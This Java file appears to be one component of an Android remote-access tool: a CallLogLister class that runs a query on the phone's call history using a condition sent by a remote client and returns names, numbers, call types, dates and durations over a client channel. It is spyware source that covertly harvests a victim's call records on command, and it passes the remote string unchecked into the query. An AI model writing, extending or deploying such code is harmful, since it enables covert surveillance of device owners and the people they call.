package my.app.Library;

import java.util.ArrayList;

import my.app.client.ClientListener;
import Packet.CallLogPacket;
import Packet.CallPacket;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;
import android.util.Log;

public class CallLogLister {

	
	public static boolean listCallLog(ClientListener c, int channel, byte[] args) {
		ArrayList<CallPacket> l = new ArrayList<CallPacket>();
		
		boolean ret =false;
		String WHERE_CONDITION = new String(args);
		Log.e("WHERE_CONDITION","WHERE_CONDITION"+ WHERE_CONDITION);
		String[] column = new String[]{  
	              CallLog.Calls.CACHED_NAME,  //姓名  
                  CallLog.Calls.NUMBER,    //号码  
                  CallLog.Calls.TYPE,  //呼入/呼出(2)/未接  
                  CallLog.Calls.DATE,  //拨打时间  
                  CallLog.Calls.DURATION   //通话时长                       
                  };
		Cursor cursor = c.getContentResolver().query(CallLog.Calls.CONTENT_URI, column , WHERE_CONDITION, null, CallLog.Calls.DEFAULT_SORT_ORDER);
		
		
        if(cursor.getCount() != 0) {
	        cursor.moveToFirst();
	        do{
	           if(cursor.getColumnCount() != 0) {
	        	   int type = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.TYPE));
	        	   long date = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE));
	        	   long duration = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DURATION));
	        	   String number  = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
	        	   String name = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME));
	        	   
	        	   l.add(new CallPacket(type, date, duration, number, name));
	           }
	        }while(cursor.moveToNext());
	        ret = true;
        }
        else
        	ret = false;
		
		
		
		c.handleData(channel, new CallLogPacket(l).build());
		return ret;
	}
	
}
